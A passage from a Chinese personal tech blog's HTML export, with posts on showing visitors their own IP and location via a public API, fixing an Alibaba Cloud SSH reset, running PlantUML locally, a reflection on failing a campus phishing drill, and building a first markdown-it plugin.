<li>[ ] 由于我的博客写作使用 Obsidian，内部链接一般使用双向链接的<strong>双中括号</strong>语法，这个插件暂时还识别不出。后续有时间改进一下。截至目前，双中括号语法已写新插件，这个问题有望解决：<a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link highlight">Hexo 博客适配 Obsidian 新语法</a>。</li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
            </footer>
        </article>
        
        <article id="636905579" class="record">
            <header>
                <h1 class="record-title">页面展示用户 IP 地址及地理位置信息</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('API');">API</button>
                    
                    <button class="btn" onclick="activeTag('IP');">IP</button>
                    
                    <button class="btn" onclick="activeTag('UA');">UA</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>9/9/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/1590736606072ip.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>利用 API 获取 IP 地址信息，这也是对 Heo 方案的改进</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>25f6686b</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>最近开始筹备隐私政策的撰写了，注意到 <a href="https://blog.zhheo.com">洪涝 Heo</a> 的隐私政策有这样一个表格，感觉有趣，尝试借鉴一下：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230909161740.webp" alt=""></p>
<p>Heo 发布过这一教程：<a href="https://blog.zhheo.com/p/70bd84fc.html">js 获取用户 IP 和地理位置信息、UA 并展示 | 张洪 Heo (zhheo.com)</a> 但是近期该 API 出现了一些问题（从上图你可以发现其中的问题所在）。下面我通过使用另一个接口： <a href="https://2023.ipchaxun.com/">https://2023.ipchaxun.com/</a> 来尝试实现这个功能。</p>
<h1>实现效果</h1>
<script src="/js/privacy.js"></script>
<table>
<thead>
<tr>
<th style="text-align:center">类型<div style="width:100px"></th>
<th style="text-align:left">信息</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">IP 地址</td>
<td style="text-align:left"><div id="userAgentIp"></div></td>
</tr>
<tr>
<td style="text-align:center">国家</td>
<td style="text-align:left"><div id="userAgentCountry"></div></td>
</tr>
<tr>
<td style="text-align:center">省份</td>
<td style="text-align:left"><div id="userAgentRegion"></div></td>
</tr>
<tr>
<td style="text-align:center">城市</td>
<td style="text-align:left"><div id="userAgentCity"></div></td>
</tr>
<tr>
<td style="text-align:center">运营商</td>
<td style="text-align:left"><div id="userAgentIsp"></div></td>
</tr>
<tr>
<td style="text-align:center">UA</td>
<td style="text-align:left"><div id="userAgent"></div></td>
</tr>
</tbody>
</table>
<script type="text/javascript">getIpInfo()</script>
<h1>编写新的 JS 文件</h1>
<pre><code class="language-js">// 获取ip
function getIpInfo(){
    var path = 'https://2024.ipchaxun.com/'; // 实测这网址会更新，比如刚写这篇文章时接口地址是2023
    if(path !== undefined){
	    // 第一步：建立所需的对象
        var httpRequest = new XMLHttpRequest();
        // 第二步：打开连接  将请求参数写在url中  ps:&quot;./Ptest.php?name=test&amp;nameone=testone&quot;
        httpRequest.open('GET', path , true);
        httpRequest.send();//第三步：发送请求  将请求参数写在URL中
        /**
         * 获取数据后的处理程序
         */
        httpRequest.onreadystatechange = function () {
            if (httpRequest.readyState == 4 &amp;&amp; httpRequest.status == 200) {
                var info = httpRequest.responseText;//获取到json字符串，还需解析
                var obj = JSON.parse(info)
                const ip = obj.ip;
                document.getElementById(&quot;userAgentIp&quot;).innerHTML = obj.ip;
                document.getElementById(&quot;userAgentCountry&quot;).innerHTML = obj.data[0];
                document.getElementById(&quot;userAgentRegion&quot;).innerHTML = obj.data[1];
                document.getElementById(&quot;userAgentCity&quot;).innerHTML = obj.data[2];
                document.getElementById(&quot;userAgentIsp&quot;).innerHTML = obj.data[4];
            }else{
                console.log('privacy.js - 获取信息失败. httpRequest.readyState=%d, httpRequest.status=%d',httpRequest.readyState,httpRequest.status);
            }
        };
    }else{
        console.log('privacy.js - path === undefined');
    }

    var uaInfo = navigator.userAgent;
    document.getElementById(&quot;userAgent&quot;).innerHTML = uaInfo;
}
</code></pre>
<p>这个文件是由洪涝 Heo <a href="https://cdn1.tianli0.top/gh/zhheo/JS-Heo@main/privacy/privacy.js">https://cdn1.tianli0.top/gh/zhheo/JS-Heo@main/privacy/privacy.js</a> 改动而来。我们不妨也将其命名为 <code>privacy.js</code> 吧。</p>
<h1>页面使用</h1>
<p>Hexo 新建页面，写入以下内容即可。</p>
<pre><code class="language-markdown">&lt;script src=&quot;[你的 privacy.js 路径]&quot;&gt;&lt;/script&gt;

| 类型&lt;div style=&quot;width:100px&quot;&gt; | 信息                              |
| :---------------------------: | :-------------------------------- |
|            IP 地址            | &lt;div id=&quot;userAgentIp&quot;&gt;&lt;/div&gt;      |
|             国家              | &lt;div id=&quot;userAgentCountry&quot;&gt;&lt;/div&gt; |
|             省份              | &lt;div id=&quot;userAgentRegion&quot;&gt;&lt;/div&gt;  |
|             城市              | &lt;div id=&quot;userAgentCity&quot;&gt;&lt;/div&gt;    |
|            运营商             | &lt;div id=&quot;userAgentIsp&quot;&gt;&lt;/div&gt;     |
|              UA               | &lt;div id=&quot;userAgent&quot;&gt;&lt;/div&gt;        |

&lt;script type=&quot;text/javascript&quot;&gt;getIpInfo()&lt;/script&gt;
</code></pre>
<p>注意上面的代码中填写你正确的 <code>privacy.js</code> 路径。</p>
<h1>本文参考</h1>
<ul>
<li><a href="https://blog.csdn.net/qq_43762932/article/details/129408876">获取 IP 地址信息的 API 合集_api 地址_psonh 的博客-CSDN 博客</a></li>
<li><a href="https://juejin.cn/post/7183234641816453175">JavaScript 获取用户操作系统信息及浏览器信息 - 掘金 (juejin.cn)</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse">JSON.parse() - JavaScript | MDN (mozilla.org)</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/slice">Array.prototype.slice() - JavaScript | MDN (mozilla.org)</a></li>
<li><a href="https://blog.zhheo.com/privacy/">隐私政策 | 张洪 Heo (zhheo.com)</a></li>
<li><a href="https://blog.zhheo.com/p/70bd84fc.html">js 获取用户 IP 和地理位置信息、UA 并展示 | 张洪 Heo (zhheo.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="1129186507" class="record">
            <header>
                <h1 class="record-title">阿里云ECS主机可ping通但拒绝连接的解决办法</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('ECS');">ECS</button>
                    
                    <button class="btn" onclick="activeTag('SSH');">SSH</button>
                    
                    <button class="btn" onclick="activeTag('IP');">IP</button>
                    
                    <button class="btn" onclick="activeTag('阿里云');">阿里云</button>
                    
                    <button class="btn" onclick="activeTag('问题解决');">问题解决</button>
                    
                    <button class="btn" onclick="activeTag('阿里巴巴');">阿里巴巴</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>9/10/2023</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>将目标IP加入阿里云白名单中</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>434e04cb</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span></span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>问题出现</h1>
<p>开学注册了，最近写了篇博客文章想像往常一样部署服务器，但是出现了连接问题。以前从来没遇到过：</p>
<pre><code>Connection reset by 我的主机IP port 22
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
FATAL {
  err: Error: Spawn failed
      at ChildProcess.&lt;anonymous&gt; (D:\uuanqin\Desktop\uuanqin-blogs\node_modules\hexo-util\lib\spawn.js:51:21)
      at ChildProcess.emit (node:events:513:28)
      at cp.emit (D:\uuanqin\Desktop\uuanqin-blogs\node_modules\cross-spawn\lib\enoent.js:34:29)
      at ChildProcess._handle.onexit (node:internal/child_process:291:12) {
    code: 128
  }
} Something's wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html

Process finished with exit code 2

</code></pre>
<p>想用 XShell 连上服务器看看，结果还是失败：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20230910111157.webp" alt="QQ截图20230910111157.png"></p>
<p>终端使用 SSH 连接也不行：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E5%9B%BE%E7%89%8720230910111113.webp" alt="QQ图片20230910111113.png"></p>
<h1>问题排查</h1>
<p>经过排查发现：</p>
<ul>
<li>服务器公网 IP 可以 Ping 通</li>
<li>安全组设置正确</li>
<li>阿里云 Workbench 工具可以远程连接</li>
<li>换学校热点、手机移动热点正常，唯独<strong>校园有线网</strong>连接出现异常</li>
</ul>
<p>综上判断，有理由怀疑是阿里云屏蔽了一些 IP。</p>
<h1>问题解决</h1>
<p>打开阿里云控制台，点击右上角头像找到安全管控：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230910112630.webp" alt="image.png"><br>
在 IP 白名单中添加当前 IP 即可。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230910112743.webp" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230910161416.webp" alt="image.png"></p>
<h1>后记</h1>
<p>取消白名单后，过一段时间就又被ban咯，所以就让它一直存在吧。</p>
<h1>本文参考</h1>
<ul>
<li><a href="https://blog.csdn.net/peng2hui1314/article/details/119756512">采坑阿里云 kex<em>exchange_identification: read: Connection reset by peer</em>阿里云 ecs read econnreset_Roc.Chang 的博客-CSDN 博客</a></li>
<li><a href="https://help.aliyun.com/zh/ecs/support/the-ssh-exchange-identification-read-connection-reset-by-peer-error-is-displayed-when-you-log-on-to-an-ecs-instance-through-ssh#823e130097gyd">提示“ssh<em>exchange_identification:read:Connectionresetbypeer”错误怎么办</em>云服务器 ECS-阿里云帮助中心 (aliyun.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="4272386753" class="record">
            <header>
                <h1 class="record-title">本地部署 PlantUML</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, 核心协同</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('PlantUML');">PlantUML</button>
                    
                    <button class="btn" onclick="activeTag('Java');">Java</button>
                    
                    <button class="btn" onclick="activeTag('jar');">jar</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>9/10/2023</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>介绍本地部署 PlantUML 的安装及使用方法</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>fea772c1</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/plantumlcover.webp</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>许多与 PlantUML 有关的插件都利用了官网提供的接口<a href="http://www.plantuml.com/plantuml/uml/SyfFKj2rKt3CoKnELR1Io4ZDoSa70000">PlantUML Web Server</a>来渲染图片，但是由于一些网络问题，我们需要在本地渲染 PlantUML。下面介绍本地安装 PlantUML 的方法。</p>
<blockquote>
<p>[!warning] 注意<br>
本地使用 PlantUML 的效率相较于使用服务器 API 的效率低</p>
</blockquote>
<h1>环境</h1>
<p>你需要有 Java 环境。下载地址：<a href="https://www.java.com/en/download/">Download Java for Windows</a></p>
<h1>安装</h1>
<p>下载 jar 包：<a href="http://sourceforge.net/projects/plantuml/files/plantuml.jar/download">plantuml.jar (sourceforge.net)</a></p>
<h1>启动</h1>
<p><code>plantuml.jar</code>下载完成后，双击是<strong>不能</strong>正确启动的，需要按照以下方式使用。</p>
<h2>方式一：GUI</h2>
<p>准备好一个文件夹，可以将其命名为 PlantumlTest，里面新建文本文件<code>sequenceDiagram.txt</code>以测试：</p>
<pre><code class="language-[此处填写：plantuml]">@startuml
Alice -&gt; Bob: test 
@enduml
</code></pre>
<p>运行命令：</p>
<pre><code class="language-sh">java -jar plantuml.jar -gui
</code></pre>
<p>在 GUI 窗口中选择 PlantumlTest 文件夹，你就会发现<code>sequenceDiagram.png</code>自动生成好了。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230910152649.webp" alt="image.png"></p>
<h2>方式二：命令行</h2>
<pre><code class="language-sh">java -jar plantuml.jar sequenceDiagram.txt
</code></pre>
<h1>本文参考</h1>
<ul>
<li><a href="https://plantuml.com/en/starting">Quick Start Guide (plantuml.com)</a></li>
<li><a href="https://plantuml.com/en/graphviz-dot">Test your GraphViz installation (plantuml.com)</a></li>
<li><a href="https://plantuml.com/en/gui">Standalone tool usage (plantuml.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="85495977">
                            <a href="#85495977">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>构建 Obsidian 的 Hexo 写作工作流</span>
                                
                                <div class="record-links-context hover">
                                    <p>我的解决方法是将 Plantuml 部署在本地。具体本地部署 Plantuml 的方法详见：<a href="#4272386753" title="本地部署 PlantUML" class="record-link highlight">本地部署 PlantUML</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="3607632637" class="record">
            <header>
                <h1 class="record-title">我上钩了——一次被钓鱼邮件受骗经历</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined, 有感而发</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('校园');">校园</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>9/22/2023</span>
                </div>
                

                

                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>d7081afd</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/qb4akV1616727180.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>吃一蛰，再吃一蛰</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>没错，我被一封钓鱼邮件诈骗了，而且被骗的非常成功。不过庆幸的是，这是学校的一次网络安全周的邮件宣传活动，对我实际上没有什么损失，反而收获一次教训。但因为很久很久没有被诈骗过了，这次「上当」了确实心有不甘。痛定思痛，决定简单写一篇受骗反思。</p>
<h1>上一次被钓鱼诈骗</h1>
<p>这并不是我第一次被钓鱼网站诈骗，上一次被诈骗还是我 11 岁的时候。那时智能手机还不流行，我就拿别人的手机玩上古版本的 QQ。不知道是不是想领一个游戏礼包，点击链接跳转到了类似 QQ 登录界面，然后输入了 QQ 号和密码完成受骗过程。钓鱼网站的 QQ 登录肯定是登录不上的，第二天 QQ 就被盗了，盗号者疯狂在我的 QQ 空间里发布 🟨 信息，小小年纪就体验一把社死的感觉 😭。</p>
<p>最后被盗 Q 号是找回来了，心态也很快平复。不过由于事情影响在被盗的第一时间我换了新 Q 号。在各种因素的影响下，新 Q 号使用至今（可惜了之前的 9️⃣ 位数 Q 号），这算是其中最深远的影响了吧。</p>
<h1>学校的「钓鱼邮件」</h1>
<p>下面就是我的「上钩」经历。在一个平静的白天中，我正在上课，摸鱼之时看手机收到一封邮件。</p>
<p>看了大概意思是这几天内改一下邮箱密码，有截止时间要求。而且想到我已经毕业，邮箱在验证上可能有需求，并且确实出现异地登录情况。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20230922125905.webp" alt="QQ截图20230922125905.png|500"></p>
<p>没细想，我就把它加入我的待办事项中。从此，脑袋里就留下一个「限时任务」的印象。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231014182936.webp" alt="image.png"></p>
<p>几天后，晚上临睡前，手机无意看到待办事项，也看到离截止时间还有几分钟，加上待会还要 🛀，于是想着尽快完事。打开钓鱼网站后，新密码都是当场想的，于是就中招了。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/123QQ%E6%88%AA%E5%9B%BE20230922130029.webp" alt="123QQ截图20230922130029.png|500"></p>
<p>值得一提是，在收到钓鱼邮件前，我曾经看过学校的公告提醒，但我真没细看，也没留下印象：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230923161108.webp" alt="image.png|305"></p>
<p>更那啥的是，我曾看过去年 <a href="https://mp.weixin.qq.com/s/0m8t1iZBOfchdAonpBbg8w">USTC月饼钓鱼邮件</a> 新闻，以为 TJU 不会又搞这一波 [^lol]。这次受骗属实怪我。</p>
<p>[^lol]: 更搞笑的是，我现在就在 USTC，月饼事件正好一周年。</p>
<h1>受骗因素</h1>
<p>一个灾难的成功发生，需要 n 重失误，并精确切入到各种漏洞之中。受骗也是如此。再此，我简略总结了导致受骗发生的几点因素：</p>
<table>
<thead>
<tr>
<th>受骗因素</th>
<th>心理活动</th>
<th>社会上相关常见诈骗</th>
</tr>
</thead>
<tbody>
<tr>
<td>伪造官方的邮件</td>
<td>忽视检查，轻信</td>
<td>伪造官网 UI、假冒「公检法」的证书诈骗、假冒警官证等。使用户确信对方身份为官方。</td>
</tr>
<tr>
<td>内容确实和自己相关</td>
<td>增加信任</td>
<td>淘宝快递诈骗、疫情密接诈骗等，骗子了解用户相关信息赢取受害者信任。</td>
</tr>
<tr>
<td>紧急期限</td>
<td>慌张而不谨慎</td>
<td>公安上门拘禁诈骗、银行卡冻结诈骗、24 小时执行死刑骗局等，利用受害者慌乱心理，使其失去理智。</td>
</tr>
<tr>
<td>认为诈骗离自己很远</td>
<td>盲目自信</td>
<td></td>
</tr>
</tbody>
</table>
<p>下两图找不同，猜猜哪个是官方的？钓鱼网页共有几处漏洞？</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/123QQ%E6%88%AA%E5%9B%BE20230922132848.webp" alt="123QQ截图20230922132848.png|500"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/123QQ%E6%88%AA%E5%9B%BE20230922132912.webp" alt="123QQ截图20230922132912.png|500"></p>
<h1>教训</h1>
<p>这次的演练成功警醒我，虽然可能如果钓鱼网站要获取更多信息的话，我可能会产生怀疑。但不管怎么说，点击了链接我就输了。况且骗子一般不会设计复杂流程，因为「越简单的步骤受骗成功率越高」。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230923155734.webp" alt="image.png|500"></p>
<p>如果真被骗了，除了提高防范意识外，不要太苛责自己，人无完人。遇到困难可以及时向他人寻求帮助。</p>
<h1>后记</h1>
<p>不过事后想想，这封开「奖」说明其实也可以做成第二重钓鱼的呢。</p>
<blockquote>
<p>[!quote] 后续<br>
本次活动以师生为演练对象， <a href="mailto:admln@tju.aduu.cc">admln@tju.aduu.cc</a> 作为发件人，以《关于邮箱密码过期请及时更新的通知》作为钓鱼邮件主题，总计发送钓鱼邮件 42922 封。大部分师生都看穿了钓鱼邮件的“伪装”，积极向信网中心反馈和举报，充分体现了我校师生良好的网络安全意识。此次演练旨在提升广大师生的邮件安全意识，演练过程不会记录您的账号密码，也不会对您的系统和设备造成任何影响。——<a href="https://mp.weixin.qq.com/s/8vQobgXgWp3tuJpe6TDkvw">天大信网</a></p>
</blockquote>
<p>推荐防范诈骗公众号：「<strong>终结诈骗</strong>」</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230923160444.webp" alt="image.png"></p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="3395837292" class="record">
            <header>
                <h1 class="record-title">第一次开发 npm 插件</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined, 有感而发</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('碎碎念');">碎碎念</button>
                    
                    <button class="btn" onclick="activeTag('开发杂记');">开发杂记</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>10/20/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/RTFM_header_2cover.webp</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>ca685d6c</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>有文档了也看不懂</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>早些时间就折腾了 Hexo 与 Obsidian 联合工作的问题。将 Obsidian 上好用的新语法移植到 Hexo 往往只差一个 markdown 渲染环节。</p>
<p>在苦苦的搜寻和探索过程中，我解决了 Obsidian 中 Callouts 语法问题，同时接触了 markdown-it-plugin。正是 <a href="https://widcard.win/posts/write-plugins/write-mdit-plugin">这篇文章</a> 为我打开了一扇新世界的大门。后来，我的目光一直从 hexo-plugin 和 markdown-it-plugin 之间徘徊，甚至萌生脚本全文替换的想法。出于易用性和普遍性的考虑，我最终决定直接开发一款 markdown-it-plugin 解决 Obsidian 语法问题。</p>
<p>入手 markdown-it 插件开发其实并不简单，虽说存在官方文档，但阅读门槛较高。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231020191310.webp" alt="image.png|375"></p>
<p>经过资料查阅，大多数的中英文博客文章（甚至是 markdown-it 本 it）都建议从<strong>模仿</strong>开始入手，官方并没有心思写过于详细的手把手教程（有趣的是，关于这个问题，官方仓库论坛甚至可以看到 <a href="https://github.com/markdown-it/markdown-it/issues/711">开发者骂街</a>🤭）</p>
<blockquote>
<p>[!cite]<br>
<a href="https://widcard.win/posts/write-plugins/write-mdit-plugin">widcardw</a>：markdown-it 的官方文档只是给了一部分案例，用于指导如何使用它的 API，将它接入到 Web 程序中，但是光看它的文档，我并没有找到写插件的头绪。因此，写插件的最好办法就是抄别人的代码。——</p>
<p><strong>How to write plugins?</strong> <a href="https://github.com/markdown-it/markdown-it/issues/10">#10</a><br>
<strong>Q</strong>: There are no any documentation or tutorial on how to write syntax plugins for Markdown-it, neither in this repository nor in internet.<br>
<strong>A</strong>: Yes, at current time it's better to <strong>look into parser src, or existing pugins</strong>. I will add more examples &amp; explanations, but do not expect it to be in top priority.</p>
</blockquote>
<p>有了这条明确的方向，我的插件开发探索开始了。</p>
<ol>
<li>首先，我需要明白 markdown-it 插件基本结构与开发方法。这一点官方是提供了一个基本概念和文档的。一口气肯定不能读完读懂，但阅读的过程中可以对基本渲染部件有所了解。</li>
<li>接下来，开始简单的插件源码阅读。当然是挑最简单的来读啦，我看了官方写的上标插件，看懂了又好像没看懂。复杂的地方就是 state、rule 这些。背后的机理还是没完全明白，不管了我要抓紧时间啊！</li>
<li>然后，找到合适的插件进行模仿和修改。我尝试阅读多款功能相近的插件，最终选出 <a href="https://www.npmjs.com/package/@peaceroad/markdown-it-renderer-image">@peaceroad/markdown-it-renderer-image</a> 作为我大改的目标。</li>
<li>有了模仿目标后就着手进行开发。这个项目不算远古项目，近期也有一定的下载量。此外，项目包含测试，以填补我 npm 插件开发盲区。整个程序代码不复杂，有些变量命名和逻辑可以进行优化。我做的工作主要是裁剪不需要的功能，写一个正则替换就行。为了项目二次开发，我把测试用例写得更好看些。</li>
<li>完成测试后就是发布环节了。发布流程也很简单，大概十几分钟后，我就能通过 npm 仓库下载自己的包开始用了，整个使用流程也十分顺利。</li>
</ol>
<p>读源码和写代码的过程中，大模型们（New Bing、ChatGPT3.5、星火认知）确实有参与，但作用不算很大，胡说八道占一半，对它的内容我都半信半疑，不如自己上网搜。</p>
<p>在校学习之余完成插件的整个开发过程，包括调研和总结，耗时 2~3 天。这次的成功也让我产生更多的开发想法，苦于在校没时间，只能期待以后尝试咯。</p>
<p>最后放上本文相关项目：<a href="https://github.com/uuanqin/markdown-it-obsidian-imgsize">uuanqin/markdown-it-obsidian-imgsize: Obsidian图片大小处理插件 (github.com)</a>，期待你的小⭐⭐😋！</p>
<p><a href="https://github.com/uuanqin/markdown-it-obsidian-imgsize"><img src="https://github-readme-stats.uuanqin.top/api/pin/?username=uuanqin&amp;repo=markdown-it-obsidian-imgsize" alt="Readme Card"></a></p>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3569112562">
                            <a href="#3569112562">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客适配 Obsidian 新语法</span>
                                
                                <div class="record-links-context hover">
                                    <p>解决 Callouts 问题的过程中，搜到 <a href="https://widcard.win/">widcardw</a> 的博客并产生启发，于是我的第一款 NPM 插件 markdown-it-obsidian-imgsize 诞生了。开发杂记详见：<a href="#3395837292" title="第一次开发 npm 插件" class="record-link highlight">第一次开发 npm 插件</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="746142122">
                            <a href="#746142122">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_百味人生);">⬤</span>
                                    
                                    <span style="color: var(--n_有感而发);">⬤</span>
                                    
                                </span>
                                
                                <span>第一次写 Hexo 插件</span>
                                
                                <div class="record-links-context hover">
                                    <p>在写新插件的过程中，我就是抱着贯彻「先看看别人怎么写，在自己改改」的理念进行的，这与我之前认为的必须把所有理论基础过一遍才能下手的观念有些不同（详看 <a href="#3395837292" title="第一次开发 npm 插件" class="record-link highlight">第一次开发 npm 插件</a>）。在学校学习过程中，我们早就熟悉了先学理论再实践的方法论，比如：学习➡️考试➡️应用。但如果在文档资料稀少或时间精力紧缺的情况下，通过模仿学习别人的例子是一个更好的选择。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="1735498523" class="record">
            <header>
                <h1 class="record-title">好像我应该也是个生活区博主</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined, 有感而发</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('网站想法');">网站想法</button>
                    
                    <button class="btn" onclick="activeTag('友链');">友链</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>10/20/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20231022173007.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>最近才想起来，应该多发轻松一点的文章才对。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>67719b1b</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>博客已经建站一年半啦 😍，但是回看 70 几篇博客文章，怎么几乎全是各种<strong>代码、命令</strong>的啊 😮😅？！！我记得我当初的建站宣言包含分享「代码、艺术、游戏、<strong>生活</strong>」的啊~</p>
<p>到现在，部分友链网站对这个博客的 <code>descr</code> 还依然保留网站最初的愿景「分享技术、分享生活」。比如下图（截自友链 <a href="https://blog.zhheo.com/link/">洪佬</a> 的朋友圈）：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231020211928.webp" alt="image.png"></p>
<p>猛写代码与操作经验文章，导致一些加我为友链的小伙伴把我归类到「技术」栏里了 🤭🤭🤭......比如下图（截自友链 <a href="https://yanyuplus.cn/friends">寒烟志</a> 的朋友圈）：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231022173007.webp" alt="image.png"></p>
<p>很多人每天都有创造自己的文字或图画等内容，当然，我也是其中乐于记录个人生活的一员。所以从现在开始我要多多更新生活类的文章啦（况且在校学习阶段也只有生活类文章能保持更新频率 😥）。</p>
<p>在做这项决定之前，我也有很多顾虑。首先就是个人的「公私」界限问题，当前的处理方法就是两个知识库：私人笔记与想法自己维护，公共内容可以发表博客。我不喜欢一个话题维持两个版本，所有我也尽量让公库和私库有机的组成整体脉络网方便管理。</p>
<p>其次就是内容如何在博客中展示的问题。对此我安装了一个简单的首页分类导航插件以便访客快速访问上古生活类文章。目前这些生活类文章都是最近整理更新的，但为了避免在别人的「友链朋友圈」进行过度张扬，我把创建日期调整到文字完成那天了。</p>
<p>目前上新的生活类文章多为曾公开发表过的文章，所以在隐私和话题方面没有什么顾虑。此外，我还意外发现，与自己写给自己看的文章相比，公开发表的文章往往更有条理、主题更集中，在内容排版方面花费有一定的功夫，利于回顾。当然，无拘无束、自由创作的理念还是会一直秉承的 <s>，发不出来就私下说 🤭</s> 。</p>
<p>对于现阶段的网站建设来讲，今天算是一个小小的里程碑。未来网站还会继续发布更多有意思的东西。</p>
